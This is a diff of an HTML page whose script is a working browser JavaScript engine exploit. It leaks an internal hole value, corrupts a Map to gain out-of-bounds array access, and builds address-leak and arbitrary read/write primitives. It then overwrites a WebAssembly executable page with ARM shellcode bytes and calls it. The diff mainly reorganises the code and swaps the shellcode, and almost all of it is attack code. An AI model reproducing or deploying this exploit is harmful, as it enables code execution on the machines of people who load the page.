@@ -1,6 +1,5 @@
 <div id="log_div"></div>
 
-<body style="background-color:white;"></body>
 <script>
 
     var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128,
@@ -11,12 +10,13 @@
     var module = new WebAssembly.Module(code);
     var instance = new WebAssembly.Instance(module);
     var wasmMain = instance.exports.main;
+
+
     new ArrayBuffer(0x10000000)
     cvt_buf = new ArrayBuffer(8);
     cvt_f64a = new Float64Array(cvt_buf);
     cvt_u64a = new BigUint64Array(cvt_buf);
     cvt_u32a = new Uint32Array(cvt_buf);
-
 
     function ftoi(f) {
         cvt_f64a[0] = f;
@@ -31,18 +31,20 @@
     function lower(i) {
         return Number(i % (2n ** 32n));
     }
+
     function upper(i) {
         return Number(i / (2n ** 32n));
     }
+
     function pair(l, h) {
         cvt_u32a[0] = l
         cvt_u32a[1] = h
         return cvt_f64a[0]
     }
+
     function itohalf(i) {
         return [lower(i), upper(i)]
     }
-
 
     function log(message) {
         const p = document.createElement("p");
@@ -54,157 +56,138 @@
         return p;
     }
 
-    function trigger() {
 
-        function boom() {
-            function getargs() {
-                return arguments;
-            }
-            let arr = getargs(1, 2, 3, 45)
-            arr.a1 = 6.6
-            let arrc = arr;
-            a = 'a1';
-            for (let i = 0; i < 816; i++) {
-                arr[a] = 5.5;
-                if (i == 805) {
-                    arr = [5, 6, 7];
-                    a = 5;
-                }
-                if (i == 810) {
-                    arr = arrc;
-                    a = 4;
-                }
-            }
-            return arr[5];
+    function boom() {
+        function getargs() {
+            return arguments;
         }
-
-        var hole = boom();
-        alert(hole)
-
-        {
-
-            var map1 = null;
-            var foo_arr = null;
-            function getmap(m) {
-                m = new Map();
-                m.set(1, 1);
-                m.set(hole, 1);
-                m.delete(hole);
-                m.delete(hole);
-                m.delete(1);
-                return m;
+        let arr = getargs(1, 2, 3, 45)
+        arr.a1 = 6.6
+        let arrc = arr;
+        a = 'a1';
+        for (let i = 0; i < 816; i++) {
+            arr[a] = 5.5;
+            if (i == 805) {
+                arr = [5, 6, 7];
+                a = 5;
             }
-            for (let i = 0; i < 0x30; i++) {
-                map1 = getmap(map1);
-                foo_arr = new Array(1.1, 1.1);//1.1=3ff199999999999a
-
+            if (i == 810) {
+                arr = arrc;
+                a = 4;
             }
-
-            var test = new ArrayBuffer(0x1235)
-            test.a = 0x11223344
-            test.aa = 0x11223344
-            test.aaa = 0x11223344
-
-
-            map1.set(0x10, -1);
-            map1.set(foo_arr, 0xffff);
-
-            arrayBufferLengthIndex = 0
-            arrayBufferBcPtrIndex = 0
-            leakObjIndex = 0
-            heapAddressIndex = 0
-
-            for (i = 0; i < 0x100; i++) {
-                ret = ftoi(foo_arr[i])
-
-                try {
-
-                    ret1 = itohalf(ret)
-                    // log((ret1[0]))
-                    // log((ret1[1]))
-
-                    if (ret == 0x2244668822446688n) {
-                        leakObjIndex = i
-                    }
-                    if (ret1[0] == 0x1235n) {
-                        arrayBufferLengthIndex = i
-                    }
-
-                    if (leakObjIndex != 0 && arrayBufferBcPtrIndex != 0) {
-
-                        break
-                    }
-                } catch (error) {
-
-                }
-            }
-
-
-            if (leakObjIndex != 0 && arrayBufferLengthIndex != 0) {
-                fetch("find")
-                function addrOf(obj) {
-                    test.a = obj
-                    test.aa = obj
-                    test.aaa = obj
-                    return lower(ftoi(foo_arr[leakObjIndex]))
-                }
-
-                function read32(address) {
-                    foo_arr[arrayBufferLengthIndex] = pair(0x10000, address)
-                    data = new DataView(test)
-                    return data.getUint32(0, true);
-                }
-
-
-                function write32(address, value) {
-                    foo_arr[arrayBufferLengthIndex] = pair(0x10000, address)
-                    data = new DataView(test)
-                    return data.setUint32(0, value, true);
-                }
-
-
-
-
-                var instanceAddr = addrOf(instance) - 1
-
-                alert("instanceAddr" + instanceAddr.toString(16))
-                var wasmRWX = 0
-                wasmRWX = read32(instanceAddr + 0x40);
-
-
-                if (wasmRWX != 0) {
-
-                    fetch("wasmRWX1 " + wasmRWX.toString(16))
-
-                    foo_arr[arrayBufferLengthIndex] = pair(0x10000, wasmRWX)
-                    data = new DataView(test);
-
-                    shellCode = [0, 113, 4, 227, 65, 113, 68, 227, 4, 112, 45, 229, 67, 115, 4, 227, 68, 116, 68, 227, 4, 112, 45, 229, 65, 113, 4, 227, 66, 114, 68, 227, 4, 112, 45, 229, 108, 117, 6, 227, 115, 127, 66, 227, 4, 112, 45, 229, 101, 127, 2, 227, 102, 121, 70, 227, 4, 112, 45, 229, 113, 124, 6, 227, 105, 118, 71, 227, 4, 112, 45, 229, 110, 116, 7, 227, 46, 113, 71, 227, 4, 112, 45, 229, 101, 126, 6, 227, 99, 117, 70, 227, 4, 112, 45, 229, 111, 125, 6, 227, 46, 116, 71, 227, 4, 112, 45, 229, 116, 113, 6, 227, 47, 115, 70, 227, 4, 112, 45, 229, 97, 127, 2, 227, 100, 113, 70, 227, 4, 112, 45, 229, 47, 116, 6, 227, 97, 116, 71, 227, 4, 112, 45, 229, 13, 0, 160, 225, 66, 16, 160, 227, 2, 32, 34, 224, 5, 112, 160, 227, 0, 0, 0, 239];
-
-                    for (let i = 0; i < shellCode.length; i++) {
-                        log(shellCode.charCodeAt(i));
-                        data.setUint8(i, shellCode[i]);
-                    }
-                    
-                    wasmMain();
-
-                }
-
-
-            }
-            else {
-                map1.set(0x10, 0);
-                map1.set(foo_arr, 0);
-                foo_arr = null
-                location.reload()
-            }
-
-            return
-
         }
+        return arr[5];
+    }
+
+    var hole = boom();
+
+    alert(hole);
+
+    log(hole);
+
+
+    var map1 = null;
+    var foo_arr = null;
+    function getmap(m) {
+        m = new Map();
+        m.set(1, 1);
+        m.set(hole, 1);
+        m.delete(hole);
+        m.delete(hole);
+        m.delete(1);
+        return m;
+    }
+    for (let i = 0; i < 0x30; i++) {
+        map1 = getmap(map1);
+        foo_arr = new Array(1.1, 1.1); //1.1=3ff199999999999a
 
     }
 
-    trigger();
+    var test = new ArrayBuffer(0x1235)
+    test.a = 0x11223344
+    test.aa = 0x11223344
+    test.aaa = 0x11223344
 
-</script>
+
+    map1.set(0x10, -1);
+    map1.set(foo_arr, 0xffff);
+
+    arrayBufferLengthIndex = 0
+    arrayBufferBcPtrIndex = 0
+    leakObjIndex = 0
+    heapAddressIndex = 0
+
+    for (i = 0; i < 0x100; i++) {
+        ret = ftoi(foo_arr[i])
+        try {
+            ret1 = itohalf(ret)
+            if (ret == 0x2244668822446688n) {
+                leakObjIndex = i
+            }
+            if (ret1[0] == 0x1235n) {
+                arrayBufferLengthIndex = i
+            }
+            if (leakObjIndex != 0 && arrayBufferBcPtrIndex != 0) {
+                break
+            }
+        } catch (error) { }
+    }
+
+
+    if (leakObjIndex != 0 && arrayBufferLengthIndex != 0) {
+        alert("find");
+        log("find");
+        function addrOf(obj) {
+            test.a = obj
+            test.aa = obj
+            test.aaa = obj
+            return lower(ftoi(foo_arr[leakObjIndex]))
+        }
+
+        function read32(address) {
+            foo_arr[arrayBufferLengthIndex] = pair(0x10000, address)
+            data = new DataView(test)
+            return data.getUint32(0, true);
+        }
+
+
+        function write32(address, value) {
+            foo_arr[arrayBufferLengthIndex] = pair(0x10000, address)
+            data = new DataView(test)
+            return data.setUint32(0, value, true);
+        }
+
+        var instanceAddr = addrOf(instance) - 1
+
+        alert("instanceAddr" + instanceAddr.toString(16));
+        log("instanceAddr" + instanceAddr.toString(16));
+
+        var wasmRWX = 0
+        wasmRWX = read32(instanceAddr + 0x40);
+
+
+        if (wasmRWX != 0) {
+
+            alert("wasmRWX1 " + wasmRWX.toString(16));
+            log("wasmRWX1 " + wasmRWX.toString(16))
+
+            foo_arr[arrayBufferLengthIndex] = pair(0x10000, wasmRWX);
+            data = new DataView(test);
+
+            shellCode = [0, 113, 4, 227, 65, 113, 68, 227, 4, 112, 45, 229, 67, 115, 4, 227, 68, 116, 68, 227, 4, 112, 45, 229, 65, 113, 4, 227, 66, 114, 68, 227, 4, 112, 45, 229, 116, 125, 6, 227, 112, 127, 66, 227, 4, 112, 45, 229, 99, 113, 6, 227, 108, 127, 66, 227, 4, 112, 45, 229, 97, 127, 2, 227, 108, 127, 70, 227, 4, 112, 45, 229, 47, 116, 6, 227, 97, 116, 71, 227, 4, 112, 45, 229, 13, 0, 160, 225, 66, 16, 160, 227, 2, 32, 34, 224, 5, 112, 160, 227, 0, 0, 0, 239];
+
+            for (let i = 0; i < shellCode.length; i++) {
+                data.setUint8(i, shellCode[i]);
+            }
+
+            wasmMain();
+        }
+    }
+    else {
+        map1.set(0x10, 0);
+        map1.set(foo_arr, 0);
+        foo_arr = null
+        location.reload()
+    }
+
+</script>No Crash
